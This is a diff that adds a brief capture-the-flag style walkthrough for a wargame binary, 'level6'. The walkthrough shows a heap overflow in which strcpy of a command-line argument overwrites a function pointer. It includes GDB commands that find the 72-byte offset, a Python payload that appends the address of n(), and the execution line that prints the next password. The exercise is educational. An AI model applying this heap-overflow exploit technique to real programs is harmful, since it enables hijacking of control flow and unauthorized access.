@@ -1,0 +1,37 @@
+We can see 3 functions. main(), m(), n()
+
+m() just prints Nope and n() shows us the level6 pass
+
+On the main() function, we can see that there's two malloc.
+One with a lenght of 64 not initialized
+Another one with a lenght of 4, where the program puts it the address of m();
+
+Later in the program, we can see that there's strcpy of the argv[1], to the
+first malloc string of 64 bits.
+
+And later again, we see that there's a call of the address stored in the second malloc.
+
+Our goal will be to overflow the first malloc, via the strcpy, and reach the
+location of the content of the second malloc.
+
+We can easly use GDB and break after the two malloc, to compare the space beetween the
+two malloc, on the heap.
+(We know that the first malloc is stored at ESP+0x1C and the second at ESP+0x18)
+
+gdb ./level6
+b *0x080484a5
+print $esp
+	0xbffff6e0
+print/x *(0xbffff6e0 + 0x18) - *(0xbffff6e0 + 0x1C)
+	0x48
+
+0x48 = 72
+
+So we have to write 72 char in the args and happen the 4 bytes of the n() address.
+
+print ("A" * 72) + "\x08\x04\x84\x54"[::-1]
+
+Execution :
+./level6 `python /tmp/exploit.py`
+
+Prints the pass.
